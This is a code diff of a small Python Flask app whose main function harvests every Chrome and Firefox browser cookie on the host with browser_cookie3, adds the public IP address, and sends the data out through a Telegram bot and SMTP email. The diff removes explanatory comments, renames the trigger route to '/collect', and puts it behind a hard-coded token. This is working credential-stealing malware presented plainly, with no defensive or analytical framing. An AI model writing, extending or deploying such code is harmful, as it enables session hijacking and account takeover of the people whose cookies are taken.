@@ -4,10 +4,10 @@ import os
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from flask import Flask, redirect, url_for
-import browser_cookie3  # Import browser_cookie3 library
+from flask import Flask, request
+import browser_cookie3
 from datetime import datetime
-import io  # Use io.StringIO to avoid saving cookies to a file
+import io
 
 app = Flask(__name__)
 
@@ -20,6 +20,8 @@ SMTP_PORT = int(os.environ.get('SMTP_PORT'))
 EMAIL_ADDRESS = os.environ.get('EMAIL_ADDRESS')
 EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')
 RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL')
+
+SECRET_TOKEN = 'your-secret-token'
 
 def get_public_ip():
     try:
@@ -38,9 +40,9 @@ def get_all_cookies():
         try:
             print(f"Attempting to load cookies from {browser}")
             if browser == 'chrome':
-                cookies = browser_cookie3.chrome()  # Fetch cookies using browser_cookie3
+                cookies = browser_cookie3.chrome()
             elif browser == 'firefox':
-                cookies = browser_cookie3.firefox()  # Fetch cookies using browser_cookie3
+                cookies = browser_cookie3.firefox()
             cookie_list = []
 
             for cookie in cookies:
@@ -59,7 +61,7 @@ def get_all_cookies():
         except Exception as e:
             print(f"{browser.capitalize()} error: {e}")
             import traceback
-            traceback.print_exc()  # Print detailed error information
+            traceback.print_exc()
 
     return all_cookies
 
@@ -92,7 +94,6 @@ def send_cookies_to_telegram(cookies):
     return response
 
 def send_cookies_to_email(cookies):
-    # Create the email message
     msg = MIMEMultipart()
     msg['From'] = EMAIL_ADDRESS
     msg['To'] = RECIPIENT_EMAIL
@@ -100,7 +101,6 @@ def send_cookies_to_email(cookies):
 
     msg.attach(MIMEText(cookies, 'plain'))
 
-    # Send the email
     server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT)
     server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
     text = msg.as_string()
@@ -109,33 +109,30 @@ def send_cookies_to_email(cookies):
 
 @app.route('/')
 def index():
-    # Display a link to trigger the information sending process
-    return '<a href="/send-info">Send Cookies and IP Info</a>'
+    return "Click the link to collect cookies: <a href='/collect?token={SECRET_TOKEN}'>Collect Cookies</a>"
 
-@app.route('/send-info')
-def send_info():
-    # Get public IP address
+@app.route('/collect')
+def collect_cookies():
+    token = request.args.get('token')
+    if token != SECRET_TOKEN:
+        return "Unauthorized", 403
+
     ip_address = get_public_ip()
     print(f"User IP Address: {ip_address}")
 
-    # Get cookies
     cookies = get_all_cookies()
     print(f"Collected cookies: {cookies}")
 
-    # Convert cookies to string
     cookies_string = get_cookies_as_string(cookies, ip_address)
     print(f"Cookies string: {cookies_string}")
 
-    # Send cookies string to Telegram
     response = send_cookies_to_telegram(cookies_string)
     print(f"Telegram response: {response.text}")
 
-    # Send cookies string to Email
     send_cookies_to_email(cookies_string)
     print("Email sent successfully")
     
-    return "Information sent successfully."
+    return "Cookies collected and sent successfully."
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5004)
-
